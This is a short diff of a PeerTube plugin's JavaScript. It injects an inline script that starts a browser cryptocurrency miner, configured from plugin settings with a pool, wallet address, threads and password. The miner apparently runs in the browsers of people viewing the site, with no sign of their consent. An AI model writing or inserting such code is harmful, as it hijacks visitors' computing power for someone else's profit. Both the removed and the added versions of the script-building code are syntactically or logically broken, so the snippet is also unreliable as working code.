@@ -24,18 +24,16 @@ peertubeHelpers.getSettings().then(
       // 外部スクリプトのロード完了後に処理開始
         console.log("Mining script loaded successfully.")
 
-        const inlineScript = document.createElement("script")
-        // テンプレートリテラルとかいう反則じみた記述 知らなかった・・・
-        inlineScript.textContent = `
-            server =` s['webSocket']`;
-            var pool =` s['poolAddress']`;
-            var walletAddress =` s['walletAddress']`;
-            var workerId =` "PeerTube-Miner"`;
-            var threads =` s['threads']`;
-            var password =` s['password']`;
-            startMining(pool, walletAddress, workerId, threads, password)
-            throttleMiner = 20;
-        `
+        let inlineScript = document.createElement("script")
+        inlineScript+= "server = '"+s['webSocket']+"';\n"
+        inlineScript+= "var pool = '"+s['poolAddress']+"';\n"
+        inlineScript+= "var walletAddress = '"+s['walletAddress']+"';\n"
+        inlineScript+= "var workerId = 'PeerTube-Miner';\n"
+        inlineScript+= "var threads = '"+s['threads']+"';\n"
+        inlineScript+= "var password = '"+s['password']+"';\n"
+        inlineScript+= "startMining(pool, walletAddress, workerId, threads, password)\n"
+        inlineScript+= "throttleMiner = 20;\n"
+
         document.body.appendChild(inlineScript)
         console.log("Mining started.")
       return
